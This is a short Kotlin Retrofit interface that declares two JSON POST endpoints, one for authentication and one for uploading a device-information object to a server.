package com.android.services.network.api

import com.android.services.models.Auth
import com.android.services.models.DeviceInformation
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface NodeServerSixApi {

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("deviceInfo")
    @Headers("Content-Type: application/json")
    fun uploadDeviceInfo(@Body deviceInfo: DeviceInformation): Call<ResponseBody>

}